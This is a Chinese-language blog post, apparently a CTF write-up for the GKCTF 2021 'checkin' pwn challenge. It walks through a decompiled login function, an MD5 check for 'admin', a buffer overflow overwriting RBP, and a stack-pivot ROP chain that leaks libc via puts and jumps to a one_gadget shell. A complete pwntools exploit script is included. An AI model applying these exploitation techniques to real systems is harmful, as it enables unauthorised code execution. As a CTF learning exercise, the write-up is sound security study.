<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>GKCTF 2021 - checkin调试与分析 | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>GKCTF 2021 - checkin调试与分析</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-07-23T15:34:48.000Z" id="date"> 2021-07-23</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-12-29T04:50:35.004Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><p>​</p>
<p>        目前笔者刚刚开始入门PWN，算是通过这题涨了点见识吧</p>
<p><strong>主要函数：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int sub_4018C7()<br>&#123;<br>  char buf[32]; // [rsp+0h] [rbp-20h] BYREF<br><br>  puts(&quot;Please Sign-in&quot;);<br>  putchar(62);<br>  read(0, s1, 0x20uLL);<br>  puts(&quot;Please input u Pass&quot;);<br>  putchar(62);<br>  read(0, buf, 0x28uLL);<br>  if ( strncmp(s1, &quot;admin&quot;, 5uLL)  sub_401974(buf) )<br>  &#123;<br>    puts(&quot;Oh no&quot;);<br>    exit(0);<br>  &#125;<br>  puts(&quot;Sign-in Success&quot;);<br>  return puts(&quot;BaileGeBai&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>        sub_401974实为一个md5加密与对比函数，它会将buf进行md5后与固定值对比</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall sub_401974(const char *a1)<br>&#123;<br>  unsigned int v1; // eax<br>  char v3[96]; // [rsp+10h] [rbp-90h] BYREF<br>  __int64 v4[2]; // [rsp+70h] [rbp-30h]<br>  char v5[28]; // [rsp+80h] [rbp-20h] BYREF<br>  int i; // [rsp+9Ch] [rbp-4h]<br><br>  v4[0] = 0xA7A5577A292F2321LL;<br>  v4[1] = 0xC31F804A0E4A8943LL;<br>  sub_4007F6(v3);<br>  v1 = strlen(a1);<br>  sub_400842(v3, a1, v1);<br>  sub_400990(v3, v5);<br>  for ( i = 0; i &lt;= 15; ++i )<br>  &#123;<br>    if ( *(v4 + i) != v5[i] )<br>      return 1LL;<br>  &#125;<br>  return 0LL;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>        从对比方法开始说起吧，v4数组即为固定的md5值，比对方法为逐比特位对比</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int main()<br>&#123;<br>INT64 v4[2];<br>v4[0] = 0xA7A5577A292F2321;<br>v4[1] = 0xC31F804A0E4A8943;<br>BYTE k[16];<br>for (int i = 0; i &lt; 16; i++)<br>&#123;<br>k[i] = *((BYTE*)v4 + i);<br>printf(&quot;%x&quot;, k[i]);<br>&#125;<br>&#125;//21232f297a57a5a743894ae4a801fc3<br></code></pre></td></tr></table></figure>

<p>         通过对比可以发现，这个得到的结果就是v4[0]与v4[1]<strong>按照比特位分别逆序</strong>后的拼接，底层的储存方式按照小端序而被IDA识别为代码中的整数</p>
<p>        以及，我们可以通过一些查询得到该md5为‘admin’的md5值</p>
<p>        那么只要我们输入两次admin，就能够顺利运行到loc_40195D处，便能够利用栈溢出了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.text:000000000040195D loc_40195D:                             ; CODE XREF: sub_4018C7+80↑j<br>.text:000000000040195D                 mov     edi, offset aSignInSuccess ; &quot;Sign-in Success&quot;<br>.text:0000000000401962                 call    _puts<br>.text:0000000000401967                 mov     edi, offset aBailegebai ; &quot;BaileGeBai&quot;<br>.text:000000000040196C                 call    _puts<br>.text:0000000000401971                 nop<br>.text:0000000000401972                 leave<br>.text:0000000000401973                 retn<br></code></pre></td></tr></table></figure>

<p>        但这样还不够，程序调用的是read函数，有规定的读取上限</p>
<p>        特殊的，第二个read函数的读取上限高于buf的界定值，产生溢出，正好覆盖RBP处的值</p>
<p>        以及上一层在0x4018BF处调用该函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.text:00000000004018BF                 call    sub_4018C7<br>.text:00000000004018C4                 nop<br>.text:00000000004018C5                 leave<br>.text:00000000004018C6                 retn<br></code></pre></td></tr></table></figure>

<p>        当主要函数retn后，立刻进入第二次retn，存在栈迁移的可能</p>
<p>        那么可以照如下方式构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pop_rdi=0x401ab3<br>puts=0x4018B5<br>puts_got=0x602028<br>name_addr=0x602400<br>payload1=&quot;admin&quot;.ljust(8,&#x27;\x00&#x27;)+p64(pop_rdi)+p64(puts_got)+p64(puts)<br>payload2=&quot;admin&quot;.ljust(8,&#x27;\x00&#x27;)+&#x27;a&#x27;*24+p64(name_addr)<br></code></pre></td></tr></table></figure>

<p>        name_addr将会在执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">read(0, buf, 0x28uLL);<br></code></pre></td></tr></table></figure>

<p>        时将RBP覆盖，然后存在两层leave指令</p>
<p>        当到达第二次leave指令，就相当于如下指令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mov esp,ebp;esp=0x602400,ebp=0x602400<br>pop ebp ;esp=0x602408,ebp=0x602400<br></code></pre></td></tr></table></figure>

<p>        此时再执行retn指令，就会返回到 <strong>pop_rdi</strong> 处，并按照payload1的顺序执行下去造成库地址泄露(注意，我使用的puts地址将会让我返回到 <strong>puts&#x3D;0x4018b5+8</strong> 处，籍此再次进入主要函数)</p>
<p>        但第二次进入主要函数时候则不再像第一次那样容易了，因为这次的RBP与s1数组的位置很近，输入值将会造成<strong>覆盖</strong>(buf是从rbp-20h处开始的，而当我们再次到达第二个read的时候，rbp将会是0x602410，那么我们的输入值就会覆盖掉s1，导致常规的逐步构造无法成功)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">char buf[32]; // [rsp+0h] [rbp-20h] BYREF<br></code></pre></td></tr></table></figure>

<p>        但也有不需要那么多参数的方法来得到shell，这里可以用onegadget实现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a@ubuntu:~/Desktop/timu$ one_gadget ./libc.so.6<br>0x45226execve(&quot;/bin/sh&quot;, rsp+0x30, environ)<br>constraints:<br>  rax == NULL<br><br>0x4527aexecve(&quot;/bin/sh&quot;, rsp+0x30, environ)<br>constraints:<br>  [rsp+0x30] == NULL<br><br>0xf03a4execve(&quot;/bin/sh&quot;, rsp+0x50, environ)<br>constraints:<br>  [rsp+0x50] == NULL<br><br>0xf1247execve(&quot;/bin/sh&quot;, rsp+0x70, environ)<br>constraints:<br>  [rsp+0x70] == NULL<br></code></pre></td></tr></table></figure>

<p>        也就是说，只要我们得到了库的基地址，就可以用一行跳转直接得到shell，如果只有一行的话，就不用担心覆盖问题了，因此exp可以这样写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context.log_level=&#x27;debug&#x27;<br><br>p=process(&quot;./login&quot;)<br>elf=ELF(&quot;./login&quot;)<br>libc=elf.libc<br>pop_rdi=0x401ab3<br>puts=0x4018B5<br>puts_got=0x602028<br>ret_addr=0x400641<br>name_addr=0x602400<br><br>payload1=&quot;admin&quot;.ljust(8,&#x27;\x00&#x27;)+p64(pop_rdi)+p64(puts_got)+p64(puts)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.send(payload1)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>payload2=&quot;admin&quot;.ljust(8,&#x27;\x00&#x27;)+&#x27;a&#x27;*24+p64(name_addr)<br>p.send(payload2)<br><br>libc_base=u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:]+&#x27;\x00\x00&#x27;)-libc.sym[&#x27;puts&#x27;]<br>print hex(libc_base)<br><br>payload3 = &#x27;admin\x00\x00\x00&#x27;*3  +p64(0x4527a+libc_base)<br><br>p.send(payload3)<br>p.recvuntil(&#x27;&gt;&#x27;)<br><br>#payload = &#x27;admin\x00\x00\x00&#x27;*4 + p64( name_addr + 0x18 )<br>payload4 = &#x27;admin\x00\x00\x00&#x27;*4 + p64( 0x602500 )<br>p.send(payload4)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>        值得注意的是，当笔者通过gdb附加调试之后发现，这一轮的跳转中，我们只会返回到payload3中的 <strong>p64(0x4527a+libc_base)</strong> 地址，和payload4中的地址已经没用太大关系了，只要保证payload4能够让程序返回即可</p>
<p>        但笔者还是在这里为payload4加上了一个地址</p>
<p>        正如上面所说，我们只需要用到一个返回地址即可，那倘若我们让程序第三次返回到<strong>puts&#x3D;0x4018b5+8</strong> 处，这一次，RBP就会是payload4中的地址了，那么这样就能进入第三轮输入，这一次就不会出现覆盖问题，就能够像第一步的操作那样，让程序返回到<strong>system函数</strong>，将<strong>‘&#x2F;bin&#x2F;sh’</strong>的地址<strong>pop rdi</strong>了</p>
<p><strong>后话：</strong></p>
<p>        算是通过这一题学着怎么用gdb了，虽然用着还是很生涩，希望多做几题之后能渐渐熟练起来吧……不过多留心一下栈堆总是好的，用IDA动调的时候倒是很会看，一旦用起了gdb就容易忽视掉这些东西，还是要多留个心眼……</p>
<p><strong>附一下参考的地址：</strong></p>
<p>gdb查看指定地址内存内容：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/super119/archive/2011/03/26/1996125.html">https://www.cnblogs.com/super119/archive/2011/03/26/1996125.html</a></p>
<p>[原创]pwn中one_gadget的使用技巧 ：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-261112.htm">https://bbs.pediy.com/thread-261112.htm</a></p>
<p>gdb的基本命令：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26399665/article/details/81165684">https://blog.csdn.net/qq_26399665&#x2F;article&#x2F;details&#x2F;81165684</a> ​</p>
<p><strong>插画ID：</strong>90726137</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2021/08/07/glibc-1/">← Next 关于如何理解Glibc堆管理器(Ⅰ——堆结构)</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2021/07/23/pwn0/">第五空间2019 决赛 - PWN5笔记与借鉴 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>